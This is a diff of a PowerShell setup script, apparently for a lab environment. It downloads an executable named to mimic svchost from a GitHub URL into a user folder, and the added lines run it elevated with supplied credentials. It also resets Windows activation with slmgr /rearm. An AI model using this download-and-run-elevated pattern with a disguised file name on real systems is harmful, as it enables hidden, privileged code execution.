@@ -22,7 +22,9 @@ Invoke-WebRequest -uri $downloadlink -OutFile $localpath
 # https://github.com/cybermias/publicrep/raw/master/guacconf/Python.37.svchost.exe
 # c:\users\cmtsadmin\searches\python37.svchost.exe 
 
-Start-Process powershell.exe -Credential $localcred -ArgumentList "start-process -filepath $localpath -verb runas"
+Start-Process powershell.exe -verb runas -ArgumentList "start-process -filepath $localpath -Credential $localcred"
+
+Start-Process powershell.exe -ArgumentList "start-process powershell.exe -Credential $localcred -ArgumentList \"start-process powershell.exe -filepath $localpath -verb runas\" "
 
 cscript c:\windows\system32\slmgr.vbs /rearm
 REG ADD "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management\" /v "PagingFiles" /t REG_MULTI_SZ /d "D:\pagefile.sys 0 0" /f
